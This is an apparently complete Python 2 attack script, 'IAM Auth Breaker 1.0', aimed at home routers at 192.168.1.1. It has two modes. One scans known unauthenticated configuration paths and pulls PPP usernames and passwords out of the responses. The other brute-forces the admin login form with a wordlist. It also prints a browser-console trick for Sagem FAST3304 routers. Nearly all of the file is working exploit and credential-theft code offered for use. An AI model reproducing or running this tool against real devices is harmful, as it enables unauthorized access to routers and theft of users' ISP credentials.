#!/usr/bin/python

import urllib
import urllib2
import sys

M = 'admin'
h = 'http://192.168.1.1'
vlinks = ["/comm/wan_cfg.sjs","/comm/users.sjs" ,"/comm/firewall.sjs","/comm/lan_comm.sjs","/sysinfo.f24"]

head = {'User-Agent': 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'}
with open('wordlist.txt', 'r') as file_in:
    file_in_content = file_in.read().splitlines()
    last_line = file_in_content[-1]

intro = \
    '''--------------------------IAM Auth Breaker 1.0--------------------------
                                                            
                                                 .:--:::.                       
                                                   .:-----:.                  
             .==-    ===                             .:------:.              
             :***:  =***.  .:.   .. .   .:.     ....    :-------.      .     
             :*-+* .*=+*. --:+*: +*+=.-*=-=*= :*+--:     .--------    :=-.   
             :*-.*=+* +*. =+ +*- +*.  **   **.**           --------.  :--=:  
             :*- -**: +*.-*=:=*- +*.  =*-:-*= -*+::.       :-----=+*+. .--:  
               :.  ::  .:  .::.:. .:    .:-:.   .:--.       =--==*****=  :  -
                                                            =-=********+   -=
   ++**++-      :*-                                         =-==*******:   :-
     **  .=++=: :*-  -+=+:  :=++= .-++=-  -+-++-:++=.      -----=+***=  .-. .
     ** .*+::+*.:*- **::=*:-*=   .*+  :*+ =*: -*= .*+     :-------==:  ----  
     ** .*+:::: :*- **::::.=*-   .*+  .** =*. :*-  *+    ---------:  .----   
     *+  :++++= :*- .=+++=  -+*+= :+++*=. =*. :*-  *+  :---------.    .-:    
                                                     .----------.             
                                                 .:-=--------:                
                                         ..::-----------:.                   
.:::::::::::::...................:::::---=-------=--::.                        
                ....:::::--------------------::::::.                          

https://github.com/roussafi-omar

------------------------Devoloped By Roussafi Omar------------------------------'''
print intro
print '''
Choose type of attack to starting exploit
1. Looking for vulnerabilities & Exploit
2. Bruteforcing
'''

try:
    numchoosen = int(input('Type a number [1 - 2]:'))
    if numchoosen not in range(1, 3):
        print 'Invalid Option'
        exit()
except ValueError:
    print 'This is not a whole number.'

if numchoosen == 2:
    print '''
 Choose the link of login in the router
 1. 192.168.1.1/Wizard/ge_login.cgi
 2. 192.168.1.1/admin.html
 3. 192.168.1.1/cgi-bin/basicauth.cgi?index.html
 '''
    try:
        pchoosen = int(input('Type a number [1 - 3]:'))
        if pchoosen not in range(1, 4):
            print 'Invalid Option'
            exit()
        else:
            if pchoosen == 1:
                p = '/Wizard/ge_login.cgi'
            elif pchoosen == 2:
                p = '/admin.html'
            elif pchoosen == 3:
                p = '/cgi-bin/basicauth.cgi?index.html'
    except ValueError:
        print 'This is not a whole number.'

raw_input('Type Enter To Start .')

def scanvlink():
    for vlink in vlinks:
        print 'Scanning : ' + h + vlink + '\n'
        vreq = urllib2.Request(h + vlink, None, head)
        try:
            vres = urllib2.urlopen(vreq)
            vja = vres.read()
            print 'Found Something in : ' + h + vlink

	    if('PPP_ConnectionTable[temp_Index]' in vja):
		if(vja.split("//PPP_ConnectionTable[temp_Index].Password")[1].split('"')[1].split('"')[0]):
			print '\n[+] Password Found ====> ', vja.split("//PPP_ConnectionTable[temp_Index].Password")[1].split('"')[1].split('"')[0]
			print '[+] ' + vja.split("PPP_ConnectionTable[temp_Index].UserName")[1].split('"')[1].split('"')[0] + ':' + vja.split("//PPP_ConnectionTable[temp_Index].Password")[1].split('"')[1].split('"')[0]
			pause = 1
			exit()
        except urllib2.HTTPError, e:
            print 'No Vulnerabilities found in : ' + h + vlink + '\n'

    print 'scanning S@gem Vulnerabilities'
    sreq = urllib2.Request(h, None, head)
    sres = urllib2.urlopen(sreq)
    sja = sres.read()
    if 'Sagem' in sja or 'sagem' in sja or 'FAST3304' in sja:
        print 'S@gem venerability found in ' + h \
            + ' go to browser and open ' + h \
            + ' click F12 or Inspect the Element then go to console and paste "mimic_button("goto: 9096..")"'
    else:
        print 'S@gem venerability not founds'
    exit()


def brutforce(vr):
    sys.stdout.write('\r' + vr + '          ')
    sys.stdout.flush()
    bodyen = {
        'password': vr,
        'user': M,
        'isSubmit': 1,
        'userlevel': 15,
        'refer': '/index.html',
        'failrefer': '/admin.html',
        }
    da = urllib.urlencode(bodyen)
    req = urllib2.Request(h + p, da, head)
    res = urllib2.urlopen(req)
    ja = res.read()
    if 'authform' in ja:
        return False
        pass
    elif '<script>location.href="?time=' in ja:
        print '\nHttp - TimeOut'
        return True
        pass
    else:
        kode = vr
        print '\n[+] Password Found ====> ', kode
        print '[+] ' + M + ':' + kode
        exit()
        return False
        pass
    pass


pause = 0
print 'Start ...'
while True:
    if pause == 0:
        if numchoosen == 1:
            scanvlink()
        if numchoosen == 2:
            for line in file_in_content:
                if brutforce(line):
                    pause = 1
                if line == last_line and pause == 0:
                    print 'password not match :('
                    exit()
    elif pause == 1:
        pass
    else:
        print '\nDouble TimeOut '
        continue
        pass
